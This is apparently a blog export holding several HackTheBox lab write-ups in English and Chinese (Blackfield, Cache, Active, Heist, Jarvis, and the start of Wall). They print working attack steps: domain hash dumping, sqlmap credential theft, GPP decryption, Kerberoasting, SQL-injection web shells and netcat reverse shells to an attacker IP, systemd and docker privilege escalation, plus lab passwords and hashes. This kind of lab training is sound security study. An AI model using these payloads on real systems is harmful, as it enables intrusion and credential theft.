set: &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume&#123;351b4712-0000-0000-0000-602200000000&#125;\\ [C:\\] - Creation time: 9/8/2020 5:40:45 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125; - Attributes: No_Auto_Release Persistent No_Writers DifferentialNumber of shadow copies listed: 1-&gt; expose %ikonw% z:-&gt; %ikonw% = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;The shadow copy was successfully exposed as z:\\.-&gt; The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files. After looking at the github page If you want to read&#x2F;copy data out of a “normally forbidden” folder, you have to act as a backup software. The shell copy command won’t work; you’ll need to open the source file manually using CreateFile making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. SeBackupPrivilegeCmdLets.dll SeBackupPrivilegeUtils.dll Evil-WinRM* PS C:\\temp&gt; Import-Module .\\SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\temp&gt; Import-Module .\\SeBackupPrivilegeCmdLets.dll*Evil-WinRM* PS C:\\temp&gt; cd z:\\windows\\ntds*Evil-WinRM* PS z:\\windows\\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\\temp\\ntds.dit*Evil-WinRM* PS z:\\windows\\ntds&gt; cd c:\\temp*Evil-WinRM* PS C:\\temp&gt; dir Directory: C:\\tempMode LastWriteTime Length Name---- ------------- ------ -----a---- 9/8/2020 5:40 AM 617 2020-09-08_5-40-45_DC01.cab-a---- 9/8/2020 5:52 AM 18874368 ntds.dit-a---- 9/8/2020 5:50 AM 12288 SeBackupPrivilegeCmdLets.dll-a---- 9/8/2020 5:51 AM 16384 SeBackupPrivilegeUtils.dll-a---- 9/8/2020 5:40 AM 88 shadow_copy.txt and we got the ntds.dit files. download to kali and use secretsdump ,I just realize still need a extra system hive file. reg save HKLM\\SYSTEM c:\\temp\\system.hive ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | moreImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c[*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: and we got the administrator hash, use evil-winrm to login and we got root!","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"}]},{"title":"HTB Cache Writeup","slug":"HTB-cache","date":"2020-05-12T00:00:00.000Z","updated":"2020-10-16T09:15:45.678Z","comments":true,"path":"2020/05/12/HTB-cache/","permalink":"https://ik0nw.github.io/2020/05/12/HTB-cache/","excerpt":"Cache writeup available","text":"Cache writeup available Reconnmap result Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 03:26 EDTNmap scan report for 10.10.10.188Host is up (0.0068s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)| 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)|_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: CacheService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds At the web page, found the hostname. Add it to the &#x2F;etc&#x2F;hosts file Tried SQL injection in the login page, it seems that it’s some frontend authentication At the same time gobuster found out some directory 2020/08/27 03:58:38 Starting gobuster===============================================================/javascript (Status: 301)/jquery (Status: 301)/server-status (Status: 403)Progress: 179615 / 220561 (81.44%)^C And yeah, in the cache.htb&#x2F;jquery&#x2F;functionality.js We found some authentication codes. and we got the creds ash&#x2F;H@v3_fun $(function()&#123; var error_correctPassword = false; var error_username = false; function checkCorrectPassword()&#123; var Password = $(&quot;#password&quot;).val(); if(Password != &#x27;H@v3_fun&#x27;)&#123; alert(&quot;Password didn&#x27;t Match&quot;); error_correctPassword = true; &#125; &#125; function checkCorrectUsername()&#123; var Username = $(&quot;#username&quot;).val(); if(Username != &quot;ash&quot;)&#123; alert(&quot;Username didn&#x27;t Match&quot;); error_username = true; &#125; &#125; $(&quot;#loginform&quot;).submit(function(event) &#123; /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false &amp;&amp; error_username ==false)&#123; return true; &#125; else&#123; return false; &#125; &#125;); After login, still didnt have any clue about next step. Went back to do some domain enumeration We actually got a new host name. Add it to host file. Now we have the OpenEMR CMS Tried the creds we found earlier on. Google about OpenEMR vulnerabilitys https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69 we came across this page, about SQL injection. http://hms.htb/portal/add_edit_event_user.php?eid=1 The eid value is vulnerable to SQL injection. Use burpsuite to capture the request GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1Host: hms.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: OpenEMR=qruref3qlj122khelbr48llu9a; PHPSESSID=t4ck5m5fkc7hrh1gsm8pued0fuUpgrade-Insecure-Requests: 1 Launch sqlmap to determine the existing database found openemr database sqlmap -r sqldump --dbs --batch[00:58:10] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.1[00:58:10] [INFO] fetching database names[00:58:10] [INFO] retrieved: &#x27;information_schema&#x27;[00:58:10] [INFO] retrieved: &#x27;openemr&#x27;available databases [2]: [*] information_schema[*] openemr[00:58:10] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27; However if we retrieve the tables, we got tons of result sqlmap -r sqldump --batch -D openemr --tables Google for the OpenEMR database structure https://www.open-emr.org/wiki/index.php/Database_Structure We found out the table users_secure holds the login credentials sqlmap -r sqldump --batch -D openemr -T users_secure --dump and yeah, we got the creds [01:11:52] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.1[01:11:52] [INFO] fetching columns for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;[01:11:52] [INFO] resumed: &#x27;id&#x27;,&#x27;bigint(20)&#x27;[01:11:52] [INFO] resumed: &#x27;username&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;password&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;last_update&#x27;,&#x27;timestamp&#x27;[01:11:52] [INFO] resumed: &#x27;password_history1&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt_history1&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;password_history2&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt_history2&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] fetching entries for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27; [01:11:52] [WARNING] reflective value(s) found and filtering outDatabase: openemrTable: users_secure[1 entry]+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| id | salt | username | password | last_update | salt_history1 | salt_history2 | password_history1 | password_history2 |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| 1 | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL | NULL | NULL | NULL |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+ Used the sqlmap cracked the password (Ignore the salt) └─# john --wordlist=/usr/share/wordlists/rockyou.txt credsUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 32 for all loaded hashesWill run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusxxxxxx (?)1g 0:00:00:00 DONE (2020-08-31 01:16) 3.846g/s 3323p/s 3323c/s 3323C/s tristan..felipeUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed I found the exploit from the searchexploit 48515.py but it seems failed for unknowed error The exploit looks easy, maybe I should do it manually write a simple reverse shell. visit the link http://hms.htb/sites/default/letter_templates/custom_pdf.php and we got the shell finally Use the creds we found earlier on, we manage to login to ash account and obtain the user.txt After some enumeration, we found port 11211 is listening to host only. ash@cache:/$ netstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* we found this article https://www.hackingarticles.in/penetration-testing-on-memcached-server/ Connected to localhost.Escape character is &#x27;^]&#x27;.get userget userVALUE user 0 5luffyENDget passwdget passwdVALUE passwd 0 90n3_p1ec3END we got the user luffy after switching user to luffy we found luffy has the docker group luffy@cache:/$ iduid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) we are able to obtain root shell, luffy@cache:/$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu latest 2ca708c1c9cc 11 months ago 64.2MB luffy@cache:/$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@23919723759f:/#","categories":[{"name":"HackTheBox-Medium","slug":"HackTheBox-Medium","permalink":"https://ik0nw.github.io/categories/HackTheBox-Medium/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}],"author":"Ikonw"},{"title":"HTB Active Writeup","slug":"HTB-Active","date":"2020-02-09T16:00:00.000Z","updated":"2023-11-29T13:14:51.758Z","comments":true,"path":"2020/02/10/HTB-Active/","permalink":"https://ik0nw.github.io/2020/02/10/HTB-Active/","excerpt":"","text":"攻击机：官方Kali linux 2019 64位作者：Ikonw 靶机介绍 一，端口扫描这边我用的是我在OSCP时候用的一个脚本工具（懒惰） nmapAutomator ./nmapAutomator.sh 10.10.10.100 Full1 除了53和445并没有什么特别能交互的端口 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 18:56 +08Nmap scan report for 10.10.10.100Host is up (0.23s latency).PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-10 10:57:27Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49169/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPC49182/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: 38s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-02-10T10:58:25|_ start_date: 2020-02-10T08:17:06Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 194.25 seconds12345678910111213141516171819202122232425262728293031323334353637383940414243444546 一，SMB ENUMERATION首先 使用smbmap 来确定anonymous用户的权限（如果有写权限可以直接用impacket 来获取shell） smbmap -H 10.10.10.1001 发现对 Replication 文件夹 READ ONLY权限（这里我本来想使用mount挂载smb, 但失败了。有成功的可以在评论告诉我。） 使用 smbclient进行连接 Replication smbclient \\\\\\\\10.10.10.100\\\\Replication1 发现两个有意思的文件夹 31B2F340-016D-11D2-945F-00C04FB984F9 是Default admin policy6AC1786C-016F-11D2-945F-00C04fB984F9 是Default domain polices12 如果没记错的话 windows server 2012以下的版本 会把密码储存在GPO。经过一番查找smb: \\active.htb\\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups 在此目录发现Groups.xml 发现帐号和密码哈希值 帐号：active.htb\\SVC_TGS哈希值：edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ12 可以使用kali自带的gpp-decrypt来破解密码 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ1 得到密码 GPPstillStandingStrong2k18现在我们有了新的帐号 利用Smbmap确认我们是否有写的权限（拿shell） smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k181 发现能读权限能读到user目录里的文件可以用smbclient 进去拿user.txt 三，ROOT之前看到 端口88 有 kerberos 在运行。尝试利用kerberoasing 攻击 Kerberoasing 攻击 利用 impacket-GetUserSPNs /usr/bin/impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 12 得到hash后 利用john the ripper进行破解得到 Administrator密码为 Ticketmaster1968 取到帐号和密码后 我们可以使用 impacket psexec 进行登录 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.1001 成功 拿到Administrator","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"smb","slug":"smb","permalink":"https://ik0nw.github.io/tags/smb/"}]},{"title":"HTB Heist Writeup","slug":"HTB-Heist","date":"2020-01-25T16:00:00.000Z","updated":"2023-11-29T13:14:25.148Z","comments":true,"path":"2020/01/26/HTB-Heist/","permalink":"https://ik0nw.github.io/2020/01/26/HTB-Heist/","excerpt":"","text":"No.4-Heist-难度简单-HTB-walkthrough攻击机：官方Kali linux 2019 64位作者：Ikonw 靶机介绍 一，端口扫描nmap -sV -sC heist.htb1Nmap scan report for heist.htb (10.10.10.149)Host is up (0.25s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-25T01:23:05 |_ start_date: N/A 1234567891011121314151617181920212223242526 二，HTTP Enumeration进入web, 是个登陆页面。 并没有找到CMS, 右下角有个 Login as guest发现这是个 类似于 Support desk 的平台。点击 Attachment 跳转到 config.txt version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh1234567891011121314151617181920212223242526272829303132333435363738394041 其中有三行是包含哈希值的 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 // Type 5 !username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 1234 按照之前所说的，这应该分别CISCO的哈希值。分别为 type 5 跟 type 7。type 5是有salt过的。利用网上的工具来进行破解。 Type 5 的比较麻烦，网上的工具没能找到密码。找到一个 github脚本。现在我们已经找到全部的账号和密码 账号 密码 admin $uperP@ssword rout3r Q4)sJu\\Y8qz*A3?d Hazard stealth1agent 三，拿到shell尝试使用现有的账号和密码 来登陆网页，但提示需要用邮箱。利用了例子如 &#97;&#100;&#109;&#x69;&#x6e;&#64;&#104;&#101;&#105;&#x73;&#x74;&#x2e;&#x68;&#x74;&#98;也没有进展。 利用metasploit 的smblogin 来进行爆破。发现只有 Hazrd:stealth1agent 可以登陆发现权限都是No Access和READ。 root@xing# smbmap -H 10.10.10.149 -u hazard -p stealth1agent[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.149...[+] IP: 10.10.10.149:445 Name: 10.10.10.149 Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY123456789 IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 在这里我们可以利用 READ ONLY 的IPC$来取得本地账号的信息。 利用rpclient来连接 rpcclient -U &quot;Hazard%stealth1agent&quot; heist.htb1 我们也可以同样利用SID来获取用户名sid的后四位是用户的编号，我们可以通过逐渐增加来找到本机的用户名字 lookupsids S-1-5-21-4254423774-1266059056-3197185112-10081 发现多三个用户为 Chase,support,Jason。 另外一个方法是用 impacket (好东西呀）。 root@xing:/opt# locate lookupsid.py/usr/share/doc/python3-impacket/examples/lookupsid.pyroot@xing:/opt# python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Brute forcing SIDs at 10.10.10.149[*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112500: SUPPORTDESK\\Administrator (SidTypeUser)501: SUPPORTDESK\\Guest (SidTypeUser)503: SUPPORTDESK\\DefaultAccount (SidTypeUser)504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\\None (SidTypeGroup)1008: SUPPORTDESK\\Hazard (SidTypeUser)1009: SUPPORTDESK\\support (SidTypeUser)1012: SUPPORTDESK\\Chase (SidTypeUser)1013: SUPPORTDESK\\Jason (SidTypeUser)123456789101112131415161718 尝试了各种组合还是无法登陆smb或者web。于是决定再扫一遍nmap 看看有没有什么高端口是漏掉的。发现了5985端口开着 WinRM 是windows 一种方便远程管理的服务；开启winrm service,便于在日常工作中，远程管理服务器，或通过脚本，同时管理多台服务器，来提高工作效率 这边可以利用一种工具叫evil-winrm 来进行登陆。 有兴趣的可以了解更多Evil-winRM 远程管理shell 首先，利用metasploit 的 scanner&#x2F;winrm&#x2F;winrm_login 模块来爆破帐号和密码。（这么多帐号和密码 到底哪个密码是哪个呀）。 把新取得的账号 全部保存进 possible_user。然后根据lookupsid取得的 DOMAIN填写。 成功取得有效登陆 Chase:Q4)sJu\\Y8qz*A3?d 利用evil-winrm 进行登陆 ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p &quot;Q4)sJu\\Y8qz*A3?d&quot; 四，提权一番探索后 发现有 firefox 的程序再跑利用微软的procdump把 firefox的日志 https://docs.microsoft.com/en-us/sysinternals/downloads/procdump 利用 evil-winrm 上传 procdump.exe 然后执行 upload proxdump.exeprocdump -ma 289212 后面用 grep 找出admin 后发现密码。使用evil win-rm 登陆后 取到 root flag","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Jarvis Writeup","slug":"HTB-jarvis","date":"2020-01-21T16:00:00.000Z","updated":"2023-11-29T13:16:30.933Z","comments":true,"path":"2020/01/22/HTB-jarvis/","permalink":"https://ik0nw.github.io/2020/01/22/HTB-jarvis/","excerpt":"","text":"挺有意思的一台机器，有挺多种方式拿 low priv shell。 攻击机：官方Kali linux 2019 64位作者：Ikonw 靶机介绍 一，端口扫描只有HTTP 比较有兴趣，title 是 Stark Hotel Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 11:48 +08Nmap scan report for jarvis.htb (10.10.10.143)Host is up (0.33s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)| 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)|_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Stark HotelService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel123456789101112131415161718 二，HTTP Enumeration第一个习惯就是先把gobuster 上起来 gobuster dir -w directory-list-2.3-medium.txt -u 10.10.10.143 -t 501 发现有 phpmyadmin经过一番尝试，default 账号和密码都无效。暂时先跳过。 继续浏览 stark hotel(钢铁侠爱好者，stark 和 jarvis) 在网页上发现几处可疑的域名 supersecurehotel.htblogger.htb 尝试着加进去 &#x2F;etc&#x2F;hosts 10.10.10.143 jarvis.htb supersecurehotel@logger.htb supersecurehotel.htb logger.htb1 然后分别用 jarvis.htb, supersecurehotel.htb, logger.htb 等域名进行访问。 结果还是跟之前一样的 并没有什么区别。我们接着探索。 一顿胡乱点击后 发现 room.php 有可疑尝试加个双引号引号 “ http://10.10.10.143/room.php?cod=1&quot;1 果然报错了下一步 我们可以利用 ORDER BY 或者 UNION SELECT来找出查询语句有几个字段。 ORDER BY 首先使用orderby子句来确定SQL语句查询的字段数量。orderby子句会根据sql查询结果的字段来排序，如果字段不存在则会报错。 可以先从10 开始试 http://10.10.10.143/room.php?cod=1 ORDER BY 101 页面显示反常，代表没有10个字段， 一个一个慢慢下试试到第7的时候 页面正常返回 http://10.10.10.143/room.php?cod=1 ORDER BY 71 确认了 有7个字段紧接着 我们能使用 UNION SELECT来确定回显位 http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,71 可以确定 1 应该是ID，所以没有显示。2 是 评分等级3 是 价钱4 是 介绍5 是 图片6 和 7 是未知。 当然这些都不重要 重要的是 回显位我们能看到。 可以利用mysql的一些函数来获取更多信息。 比如database()数据库的名字叫hotel http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,database(),4,5,6,71 三，拿shell我们有两种方式来拿到 www-data。一种为利用mysql读写的方式注入php执行nc SELECT ... INTO OUTFILE &#x27;file_name&#x27;1http://10.10.10.143/room.php?cod=999 UNION SELECT 1,2,&#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.10 1234&quot;);?&gt;&#x27;,4,5,6,7 INTO OUTFILE &#x27;/var/www/html/malicious.php&#x27;1 然后我们访问 10.10.10.143&#x2F;malicious.php成功拿到 shell 第二种方式是通过 mysql函数导出 数据库的用户名和密码 登陆phpmyadmin. 使用 group_concat 可以把 同一个分组中的值连接起来,返回一个字符串结果 利用 “:” 来隔离分开 room.php?cod=999 union select 1,2,(select group_concat(user,&quot;:&quot;,password,&quot;:&quot;,host) from mysql.user),4,5,6,71 我们成功取得 数据库的账号和密码哈希值 Dbadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0利用 crackstation.net 来进行破解哈希值得到密码 imissyou 找回之前的 phpmyadmin 登陆后发现Apache&#x2F;2.4.25phpmyadmin 4.8.0文章发表的时候 phpmyadmin 最新的版本为 5.0.1一番searchsploit后发现 4.8.0和4.8.1 版本有远程执行文件包含漏洞 phpmyadmin 4.8 文件包含漏洞传送门 首先 运行sql命令 select &#x27;&lt;?php system(&quot;nc -e /bin/bash 10.10.14.12 1234&quot;);?&gt;&#x27;1 拿到session的数值然后进行访问 10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_b6uigkomnmk4oaa91ckc4chk4nfahaqi1 成功！ 四，提高用户权限第一件事情就是试试 sudo -l 有没有任何可以利用的权限。 Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py1234567 这是一个小型的警报器仔细看了源代码，有一个地方可以使用命令注入，虽然做了点黑名单来过滤。 但是由于 $ 还能使用。 我们可以用类似 $(cmd) 的操作。 sudo -u pepper /var/www/Admin-Utilities/simpler.py -pEnter an IP: $(bash)12 我们成功拿到pepper的shell这里不懂出于什么原因 我各种命令全部都没响应。于是我用nc 重新生成了一个shell pepper@jarvis:/$nc -e /bin/bash 10.10.14.10 1234nc -e /bin/bash 10.10.14.10 1234123 于是我们成功拿到pepper 的权限 五，ROOT提权首先我们来查看SUID files find / -perm -4000 2&gt;/dev/null1 发现 systemctl 比较可疑。通过 gtfobins 发现存在SUID 来进行提权的方法。一般看到这种我都比较喜欢手动操作。创建一个 pwn.service 在 pepper 的主目录里 并且把 ExecStart 指向 nc.sh [Service]Type=oneshotExecStart=/home/pepper/nc.sh[Install]WantedBy=multi-user.target123456#!/bin/bashnc -e /bin/bash 10.10.14.10 1234123 然后我们要创建一个 symlink 起来 systemctl link /home/pepper/pwn.service1 打开 nc 接听 然后启动我们的pwn服务 systemctl start pwn1 我们成功拿到root","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Wall Writeup","slug":"HTB-wall","date":"2020-01-12T16:00:00.000Z","updated":"2023-11-29T13:19:56.121Z","comments":true,"path":"2020/01/13/HTB-wall/","permalink":"https://ik0nw.github.io/2020/01/13/HTB-wall/","excerpt":"这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。","text":"这台机器比较有意思，正如名字 有一道“墙”。有趣的是这台机器的CMS CVE和机器的作者是同一个人。作者尽量写出自己在遇到问题的时候碰到的坑 以及做了什么尝试和思路。 攻击机：官方Kali linux 2019 64位作者：Ikonw 靶机介绍 一，端口扫描正常的nmap端口扫描 没有太多信息。 22 SSH 和端口 80 web 服务 